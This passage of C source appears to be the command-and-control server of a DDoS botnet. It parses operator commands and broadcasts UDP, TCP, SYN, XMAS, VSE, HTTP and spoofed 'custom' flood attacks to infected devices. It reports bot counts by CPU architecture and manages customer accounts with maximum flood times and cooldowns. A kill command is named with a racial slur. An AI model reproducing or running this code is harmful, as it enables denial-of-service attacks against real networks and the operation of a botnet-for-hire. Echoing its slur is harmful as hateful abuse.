                    }
                    Trim(wld_motd);
                    sprintf(pr_motd, ""W"["R"MOTD"W"]"R": "W"%s\r\n", wld_motd);
                    sprintf(axis, ""R"["W"MOTD Changed To"R": "W"%s"R"]\r\n", wld_motd);
                    if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                }
            }
            else{
                sprintf(axis, "\x1b[31mMust Be Admin!\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            }
        }
        else if(strstr(buf, ""TRIG" UDP") || strstr(buf, ""TRIG" STD") || strstr(buf, ""TRIG" TCP") || strstr(buf, ""TRIG" ACK") || strstr(buf, ""TRIG" SYN") || strstr(buf, ""TRIG" VSE") || strstr(buf, ""TRIG" XMAS") || strstr(buf, ""TRIG" HTTP") || strstr(buf, ""TRIG" CNC") || strstr(buf, ""TRIG" CUDP") || strstr(buf, ""TRIG" CTCP") || strstr(buf, ""TRIG" CVSE") || strstr(buf, ""TRIG" CXMAS")){
            /*
            argv0 1 2 3 4 5 6 7 8 /9 /10
            * . UDP ip port time spoof size poll /sleep /check
            */
            
            int req_args = 0;
            if(strstr(buf, ""TRIG" UDP") || strstr(buf, ""TRIG" TCP") || strstr(buf, ""TRIG" ACK") || strstr(buf, ""TRIG" SYN") || strstr(buf, ""TRIG" STD") || strstr(buf, ""TRIG" XMAS") || strstr(buf, ""TRIG" VSE") || strstr(buf, ""TRIG" CNC")){
                req_args = 5;  
            } else if(strstr(buf, ""TRIG" CUDP") || strstr(buf, ""TRIG" CTCP")){
                req_args = 9;
            } else if(strstr(buf, ""TRIG" CVSE") || strstr(buf, ""TRIG" CXMAS")){
                req_args = 8;
            } else if(strstr(buf, ""TRIG" HTTP")){
                req_args = 7;
            }
            char atkcmd[2048];
            sprintf(atkcmd, "%s", buf);
            Split_Str(atkcmd); //Split Our CMD Into Args
            memset(atkcmd, 0, sizeof(atkcmd));
            if(input_argc != req_args){
                printf(""W"["Y"Invalid Syntax"W"]["R"%s"W"]: "R"%s", ACCS[fnd].axid, buf);
                Trim(input_argv[1]);
                if(strstr(buf, ""TRIG" UDP") || strstr(buf, ""TRIG" TCP") || strstr(buf, ""TRIG" ACK") || strstr(buf, ""TRIG" SYN") || strstr(buf, ""TRIG" STD") || strstr(buf, ""TRIG" XMAS") || strstr(buf, ""TRIG" VSE") || strstr(buf, ""TRIG" CNC")){
                    sprintf(axis, ""W"["R"Invalid Syntax"W"]\r\n"R"["W"Usage"R"]"W":  "TRIG" %s IP PORT TIME\r\n", input_argv[1]);
                    if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                } else if(strstr(buf, ""TRIG" CUDP")){
                    sprintf(axis, ""W"["R"Invalid Syntax"W"]\r\n"R"["W"Usage"R"]"W":  "TRIG" CUDP [IP] [PORT] [TIME] [SPOOFS] [SIZE(0-10000)] [POLL] [SLEEP]\r\n");
                    if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                } else if(strstr(buf, ""TRIG" CTCP")){
                    sprintf(axis, ""W"["R"Invalid Syntax"W"]\r\n"R"["W"Usage"R"]"W":  "TRIG" CTCP [IP] [PORT] [TIME] [SPOOFS] [FLAGS] [SIZE[0-10000)] [POLL]\r\n");
                    if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                } else if(strstr(buf, ""TRIG" CVSE") || strstr(buf, ""TRIG" CXMAS")){
                    sprintf(axis, ""W"["R"Invalid Syntax"W"]\r\n"R"["W"Usage"R"]"W":  "TRIG" %s [IP] [PORT] [TIME] [SPOOFS] [SIZE(0-1024)] [POLL]\r\n", input_argv[1]);
                    if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                } else if(strstr(buf, ""TRIG" HTTP")){
                    sprintf(axis, ""W"["R"Invalid Syntax"W"]\r\n"R"["W"Usage"R"]"W":  "TRIG" HTTP [URL] [PORT] [TIME] [THREADS] [METHOD]\r\n");
                    if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                }    
                if(send(axisfd, axisprompt, strlen(axisprompt), MSG_NOSIGNAL) == -1) return;
                memset(buf, 0, sizeof(buf));
                req_args = 0;
                continue;
            }
            int mytarg = atoi(input_argv[2]);
            int mysecs = atoi(input_argv[4]);

            int x = 0;
            int targ_black = 0;
            char *line = NULL;
            size_t n = 0;
            FILE *f = fopen(""LFD"/BLACK.lst", "r") ;
            while (getline(&line, &n, f) != -1){
                if (strstr(line , input_argv[2]) != NULL){
                    targ_black = 1;
                    printf(""W"["Y"BLACK ATTEMPT"W"]["R"%s"W"]: "R"%s", ACCS[fnd].axid, buf);
                    sprintf(axis, ""R"["W"%s - Attack Not Sent! Host %s is Blacklisted..."R"]\r\n", MNGRS[axisfd].nick, input_argv[2]);
                    if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    if(send(axisfd, axisprompt, strlen(axisprompt), MSG_NOSIGNAL) == -1) return;
                }
            }
            fclose(f);
            free(line);
            if(targ_black) continue;
            else if(mysecs > ACCS[fnd].axsecs){
                sprintf(axis, ""R"["W"Attack Not Sent! "W"Exceeded Your Max Flood Time..."R"]\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            }
            else if(MNGRS[axisfd].cdsts == 1){
                sprintf(axis, ""R"["W"%s, Server is Cooling Down - %d Second(s) Left..."R"]\r\n", MNGRS[axisfd].nick, MNGRS[axisfd].axcldwn - MNGRS[axisfd].cdscs);
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            }
            else{
                printf(""W"["Y"!"W"]["R"%s"W"]: "R"%s", ACCS[fnd].axid, buf);
                Trim(buf);
                Broadcast(buf, axisfd, usrnms, 0, MXFDS, axisfd);
                sprintf(axis, ""W"["R"Attack Sent!"W"]\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                pthread_t cdthread;
                struct CLDWNArgs argg;
                if(MNGRS[axisfd].axcldwn > 0){
                    argg.sock = axisfd;
                    argg.seconds = MNGRS[axisfd].axcldwn;
                    pthread_create(&cdthread, NULL, &En_Cooldown, (void *)&argg);
                }
            }
            memset(buf, 0, sizeof(buf));
        }
        else if(strstr(buf, ""TRIG" NIGGA")){ //Kill Cmd
            if(MNGRS[axisfd].axadm == 1){
                Trim(buf);
                Broadcast(buf, axisfd, usrnms, 0, MXFDS, axisfd);
                sprintf(axis, ""W"["R"Attacks Killed!"W"]\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            }
            else{
                sprintf(axis, "\x1b[31mMust Be Admin!\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            }
        }
        else if(strstr(buf, "help") || strstr(buf, "HELP")){           
            sprintf(axis, ""W"╔═════════════════════════════════════╗\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ METHODS \x1b[90m- "R"Shows Attack Commands     "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ TOOLS   \x1b[90m- "R"Shows Available Tools     "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ SERVER  \x1b[90m- "R"Shows ServerSide Commands "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ ADMIN   \x1b[90m- "R"Shows Admin Commands      "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"╚═════════════════════════════════════╝\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, "METHODS") || strstr(buf, "methods")){ 
            sprintf(axis, ""W"╔═════════════════════════════════════════════════════════════════════════╗\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ Custom UDP  \x1b[90m- "R""TRIG" CUDP [IP] [PORT] [TIME] [SPOOFS] [SIZE] [POLL] [SLEEP]  "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ Custom TCP  \x1b[90m- "R""TRIG" CTCP [IP] [PORT] [TIME] [SPOOFS] [FLAGS] [SIZE] [POLL]  "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ Custom XMAS \x1b[90m- "R""TRIG" CXMAS [IP] [PORT] [TIME] [SPOOFS] [SIZE(0-1024)] [POLL] "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ Custom VSE  \x1b[90m- "R""TRIG" CVSE [IP] [PORT] [TIME] [SPOOFS] [SIZE(0-1024)] [POLL]  "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ RHex HTTP \x1b[90m- "R""TRIG" HTTP [URL] [PORT] [TIME] [THREADS] [METHOD(GET/POST/HEAD)]"W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"╚═════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;

            sprintf(axis, ""W"╔═════════════════════════════════╗\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return; 
            sprintf(axis, ""W"║ UDP \x1b[90m- "R""TRIG" UDP [IP] [PORT] [TIME]  "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ TCP \x1b[90m- "R""TRIG" TCP [IP] [PORT] [TIME]  "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ SYN \x1b[90m- "R""TRIG" SYN [IP] [PORT] [TIME]  "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ ACK \x1b[90m- "R""TRIG" ACK [IP] [PORT] [TIME]  "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ STD \x1b[90m- "R""TRIG" STD [IP] [PORT] [TIME]  "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ XMAS \x1b[90m-"R""TRIG" XMAS [IP] [PORT] [TIME] "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ VSE \x1b[90m- "R""TRIG" VSE [IP] [PORT] [TIME]  "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ CNC \x1b[90m- "R""TRIG" CNC [IP] [PORT] [TIME]  "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"╚═════════════════════════════════╝\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, "TOOLS") || strstr(buf, "tools")){           
            sprintf(axis, ""W"╔═══════════════════════════════╗\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ IP Lookup \x1b[90m- "R"IPLOOKUP [TARGET] "W"║\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ Resolver \x1b[90m- "R"RESOLVE [TARGET]   "W"║\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"╚═══════════════════════════════╝\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, "SERVER") || strstr(buf, "server")){           
            sprintf(axis, ""W"╔═════════════════════════════╗\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ BOTS \x1b[90m- "R"Shows Bot Count/Arch "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ STATS \x1b[90m- "R"Show Account Stats  "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ ONLINE \x1b[90m- "R"Shows Online Users "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ MSG \x1b[90m- "R"Direct Message A User "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"║ CLS \x1b[90m- "R"Clears Screen         "W"║\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            sprintf(axis, ""W"╚═════════════════════════════╝\x1b[0m\r\n");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, "admin") || strstr(buf, "ADMIN")){  
            if(MNGRS[axisfd].axadm == 1){           
                sprintf(axis, ""W"╔══════════════════════════════════════════════════╗\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"║ Create A Client Account \x1b[90m- "R"ADDUSER                "W"║\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"║ Delete A Client Account \x1b[90m- "R"DELUSER                "W"║\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"║ LISTEN ON/OFF \x1b[90m- "R"Listen To User Inputs            "W"║\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"║ CHANGEMOTD \x1b[90m- "R"Change Message Of The Day           "W"║\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"║ Kick \x1b[90m- "R"KICK USER=[USERNAME] | KICK ID=[ID#]      "W"║\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"║ Connection Ban \x1b[90m- "R"BAN IP=[IP]                     "W"║\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"║ User Ban \x1b[90m- "R"BAN USER=[USER] | BAN ID=[ID#]        "W"║\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"║ "R"(User/ID Ban Resolves and Bans Their IP Address) "W"║\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"║ Unban \x1b[90m- "R"UNBAN IP=[IP]                            "W"║\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"║ Blacklist IPv4 \x1b[90m- "R"BLACKLIST                       "W"║\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"║ Un-Blacklist IPv4\x1b[90m- "R"RMBLK                         "W"║\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                sprintf(axis, ""W"╚══════════════════════════════════════════════════╝\x1b[0m\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1);
            }
            else{
                sprintf(axis, ""W"["R"Permission Denied!"W"]\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            }
        }
        else if(strstr(buf, "listen on") || strstr(buf, "LISTEN ON")){
            if(MNGRS[axisfd].axadm == 1){   
                if(MNGRS[axisfd].lblock == 1){
                    MNGRS[axisfd].lblock = 0;
                    sprintf(axis, ""Y"Listening Block Opened!\x1b[37m\r\n");
                    if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                }
                else{
                    sprintf(axis, "\x1b[31mError, Already Listening...\x1b[37m\r\n");
                    if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                }
            }
            else{
                sprintf(axis, ""W"["R"Permission Denied!"W"]\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            }
        }
        else if(strstr(buf, "listen off") || strstr(buf, "LISTEN OFF")){
            if(MNGRS[axisfd].axadm == 1){ 
                if(MNGRS[axisfd].lblock == 0) {
                    MNGRS[axisfd].lblock = 1;
                    sprintf(axis, ""Y"Listening Block Closed!\x1b[37m\r\n");
                    if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                }
                else{
                    sprintf(axis, "\x1b[31mError, Listening Block Not Open...\x1b[37m\r\n");
                    if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                }
            }
            else{
                sprintf(axis, ""W"["R"Permission Denied!"W"]\r\n");
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            }
        }
        else if(strstr(buf, "online") || strstr(buf, "ONLINE")){
            int kkkkkk;
            sprintf(axis, AXISY""R"--- "W"Online Users "R"---"AXISY"\x1b[37m\r\n");
            if(send(axisfd, axis, strlen(axis), 0) == -1) return;
            for(kkkkkk = 0; kkkkkk < MXFDS; kkkkkk++)
            {
                if(!MNGRS[kkkkkk].connd) continue;
                if(MNGRS[axisfd].axadm == 1){
                    sprintf(axis, ""W"ID("Y"%d"W") %s "R"| "Y"%s\x1b[37m\r\n", kkkkkk, MNGRS[kkkkkk].nick, MNGRS[kkkkkk].ip);
                } else {
                    sprintf(axis, ""W"ID("Y"%d"W") %s\x1b[37m\r\n", kkkkkk, MNGRS[kkkkkk].nick);
                }
                if(send(axisfd, axis, strlen(axis), 0) == -1) return;
            }
        }
        else if(strstr(buf, "msg") || strstr(buf, "MSG")){
            int pmfd, sent = 0;
            char pmuser[50];
            char privmsg[1024];
            sprintf(axis, ""R"["W"Direct Message"R"]\r\n"R"["W"Username"R"]"W": ");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            while(fdgets(pmuser, sizeof pmuser, axisfd) < 1){
                Trim(pmuser);
                if(strlen(pmuser) < 3){
                    memset(pmuser, 0, sizeof(pmuser));
                    memset(privmsg, 0, sizeof(privmsg));
                    continue;
                }
                break;
            }
            Trim(pmuser);
            sprintf(axis, ""R"["W"Message"R"]"W": ");
            if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            while(fdgets(privmsg, sizeof privmsg, axisfd) < 1){
                Trim(privmsg);
                if(strlen(privmsg) < 1){
                    memset(pmuser, 0, sizeof(pmuser));
                    memset(privmsg, 0, sizeof(privmsg));
                    continue;
                }
                break;
            }
            Trim(privmsg);
            for(pmfd = 0; pmfd < MXFDS; pmfd++) {
                if(MNGRS[pmfd].connd) {
                    if(!strcmp(pmuser, MNGRS[pmfd].nick)) {
                        sprintf(axis, ""R"["W"Message from "Y"%s"W": "Y"%s"R"]\r\n", MNGRS[axisfd].nick, privmsg);
                        if(send(pmfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                        sprintf(axis, ""R"%s"W"@"R"軸"W": "W"", MNGRS[pmfd].nick);
                        if(send(pmfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                        sent = 1;
                        break;
                    }
                }
            }
            if(sent && pmuser != NULL){
                sprintf(axis, ""R"["W"Message Sent To "Y"%s"R"]\r\n", pmuser);
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                memset(pmuser, 0, sizeof(pmuser));
                memset(privmsg, 0, sizeof(privmsg));
                sent = 0;
            }
            else if(!sent){
                sprintf(axis, "\x1b[31mCouldn't Find \x1b[33m%s\x1b[37m\r\n", pmuser);
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                memset(pmuser, 0, sizeof(pmuser));
                memset(privmsg, 0, sizeof(privmsg));
            }
        }
        else if(strstr(buf, "stats") || strstr(buf, "STATS")){
            sprintf(axis, AXISY""R"--- "W"Account Statistics "R"---"AXISY"\x1b[37m\r\n");
            if(send(axisfd, axis, strlen(axis), 0) == -1) return;
            sprintf(axis, AXISY" "W"Account Expiry - "Y"%s\x1b[37m\r\n", MNGRS[axisfd].axexp);
            if(send(axisfd, axis, strlen(axis), 0) == -1) return;
            sprintf(axis, AXISY" "W"Max Flood Time - "Y"%d\x1b[37m\r\n", MNGRS[axisfd].axsecs);
            if(send(axisfd, axis, strlen(axis), 0) == -1) return;
            sprintf(axis, AXISY" "W"Cooldown - "Y"%d\x1b[37m\r\n", MNGRS[axisfd].axcldwn);
            if(send(axisfd, axis, strlen(axis), 0) == -1) return;
        }
        else if(strstr(buf, "bots") || strstr(buf, "BOTS")){  
            countArch();
            if(DevsConnected() == 0){
                sprintf(axis, ""R"Users ["W"%d"R"]\r\n\x1b[0m", UsersOnline);
                if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
            }
            else{
                if(MNGRS[axisfd].axadm == 1){
                    sprintf(axis, ""R"Users ["W"%d"R"]\r\n\x1b[0m", UsersOnline);
                    if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    if(MIPS != 0){
                        sprintf(axis, ""R"軸.Mips ["W"%d"R"]\r\n\x1b[0m", MIPS);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(MIPSEL != 0){
                        sprintf(axis, ""R"軸.Mipsel ["W"%d"R"]\r\n\x1b[0m", MIPSEL);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(ARM4 != 0){
                        sprintf(axis, ""R"軸.Armv4 ["W"%d"R"]\r\n\x1b[0m", ARM4);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(ARM5 != 0){
                        sprintf(axis, ""R"軸.Armv5 ["W"%d"R"]\r\n\x1b[0m", ARM5);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(ARM6 != 0){
                        sprintf(axis, ""R"軸.Armv6 ["W"%d"R"]\r\n\x1b[0m", ARM6);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(ARM7 != 0){
                        sprintf(axis, ""R"軸.Armv7 ["W"%d"R"]\r\n\x1b[0m", ARM7);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(X86 != 0){
                        sprintf(axis, ""R"軸.x86 ["W"%d"R"]\r\n\x1b[0m", X86);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(PPC != 0){
                        sprintf(axis, ""R"軸.Powerpc ["W"%d"R"]\r\n\x1b[0m", PPC);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(SUPERH != 0){
                        sprintf(axis, ""R"軸.SuperH ["W"%d"R"]\r\n\x1b[0m", SUPERH);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(M68K != 0){
                        sprintf(axis, ""R"軸.M68k ["W"%d"R"]\r\n\x1b[0m", M68K);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(SPARC != 0){
                        sprintf(axis, ""R"軸.Sparc ["W"%d"R"]\r\n\x1b[0m", SPARC);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(UNKNOWN != 0){
                        sprintf(axis, ""R"軸.Unknown ["W"%d"R"]\r\n\x1b[0m", UNKNOWN);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    if(DEBUG != 0){
                        sprintf(axis, ""R"軸.Debug ["W"%d"R"]\r\n\x1b[0m", DEBUG);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                    }
                    sprintf(axis, ""R"Total: ["W"%d"R"]\r\n\x1b[0m", DevsConnected());
                    if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                }
                else{
                    sprintf(axis, ""R"Devices: "W"Enough To Beam Shit\r\n");
                    if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                }
            }
            MIPS = 0;
            MIPSEL = 0;
            ARM4 = 0;
            ARM5 = 0;
            ARM6 = 0;
            ARM7 = 0;
            X86 = 0;
            PPC = 0;
            SUPERH = 0;
            M68K = 0;
            SPARC = 0;
            UNKNOWN = 0;
            DEBUG = 0;
        }
        else if(strstr(buf, "adduser") || strstr(buf, "ADDUSER")){
            if(MNGRS[axisfd].axadm == 1 ){
                int ret, kdm, new_bc, new_secs, new_cldwn;
                char new_user[40], new_pass[40], new_type[20], new_plan[20], new_expr[20], new_seconds[10], new_cd[10];
                readduser:
                if(send(axisfd, ""Y"[Username]"W": \x1b[37m", strlen(""Y"[Username]"W": \x1b[37m"), MSG_NOSIGNAL) == -1) return;
                //memset(new_user, 0, sizeof(new_user));
                while(ret = read(axisfd, new_user, sizeof(new_user))){
                    new_user[ret] = '\0';
                    Trim(new_user);
                    if(strlen(new_user) < 3) continue; //Username Can't Be Under 3 Chars
                    break;
                }
                for(kdm = 0; kdm < MXFDS; kdm++){
                    if(strstr(ACCS[kdm].axid, new_user)){
                        sprintf(axis, "\x1b[31mThe Username "W"%s is Already Taken...\x1b[37m\r\n", new_user);
                        if(send(axisfd, axis, strlen(axis), MSG_NOSIGNAL) == -1) return;
                        goto readduser;
                    }
                }
                sleep(0.5);
                if(send(axisfd, ""Y"[Password]"W": \x1b[37m", strlen(""Y"[Password]"W": \x1b[37m"), MSG_NOSIGNAL) == -1) return;
                //memset(new_pass, 0, sizeof(new_pass));
                while(ret = read(axisfd, new_pass, sizeof(new_pass))){
                    new_pass[ret] = '\0';
                    Trim(new_pass);
                    if(strlen(new_pass) < 3) continue;
                    break;
                }
                Trim(new_pass);
                sleep(0.5);
                if(send(axisfd, ""Y"[Status]-[reg/admin]"W": \x1b[37m", strlen(""Y"[Status]-[reg/admin]"W": \x1b[37m"), MSG_NOSIGNAL) == -1) return;
                //memset(new_type, 0, sizeof(new_type));
                while(ret = read(axisfd, new_type, sizeof(new_type))){
                    new_type[ret] = '\0';
                    Trim(new_type);
                    if(strlen(new_type) < 2) continue;
                    break;
                }
                Trim(new_type);
                sleep(0.5);
                if(send(axisfd, ""Y"[Expiration]-[DD/MM/YYYY Ex: 10/09/2019]"W": \x1b[37m", strlen(""Y"[Expiration]-[DD/MM/YYYY Ex: 10/09/2019]"W": \x1b[37m"), MSG_NOSIGNAL) == -1) return;
                //memset(new_expr, 0, sizeof(new_expr));
                while(ret = read(axisfd, new_expr, sizeof(new_expr))){
                    new_expr[ret] = '\0';
                    Trim(new_expr);
                    if(strlen(new_expr) < 8) continue;
                    break;
                }
                Trim(new_expr);
                sleep(0.5);
                if(send(axisfd, ""Y"[Account Bot Access]-[0/50/100/1000/5000/-1(ALL)]"W": \x1b[37m", strlen(""Y"[Account Bot Access]-[0/50/100/1000/5000/-1(ALL)]"W": \x1b[37m"), MSG_NOSIGNAL) == -1) return;
                //memset(new_plan, 0, sizeof(new_plan));
                while(ret = read(axisfd, new_plan, sizeof(new_plan))){
                    new_plan[ret] = '\0';
                    Trim(new_plan);
                    if(strlen(new_plan) < 1) continue;
                    break;
                }
                Trim(new_plan);
                sleep(0.5);
                if(send(axisfd, ""Y"[Max Flood Time(In Seconds)]"W": \x1b[37m", strlen(""Y"[Max Flood Time(In Seconds)]"W": \x1b[37m"), MSG_NOSIGNAL) == -1) return;
                //memset(new_seconds, 0, sizeof(new_seconds));
                if(new_secs) new_secs = 0;
                while(ret = read(axisfd, new_seconds, sizeof(new_seconds))){
                    new_seconds[ret] = '\0';
                    Trim(new_seconds);
                    if(strlen(new_seconds) < 1) continue;
                    break;
                }
                Trim(new_seconds);
                new_secs = atoi(new_seconds);
                sleep(0.5);
                if(send(axisfd, ""Y"[Cooldown(In Seconds - 0 For None)]"W": \x1b[37m", strlen(""Y"[Cooldown(In Seconds - 0 For None)]"W": \x1b[37m"), MSG_NOSIGNAL) == -1) return;
                //memset(new_cd, 0, sizeof(new_cd));
                if(new_cldwn) new_cldwn = 0;
                while(ret = read(axisfd, new_cd, sizeof(new_cd))){
                    new_cd[ret] = '\0';
                    Trim(new_cd);
                    if(strlen(new_cd) < 1) continue;
                    break;
                }
                Trim(new_cd);
                new_cldwn = atoi(new_cd);
                FILE *uinfo = fopen(DB, "a+");
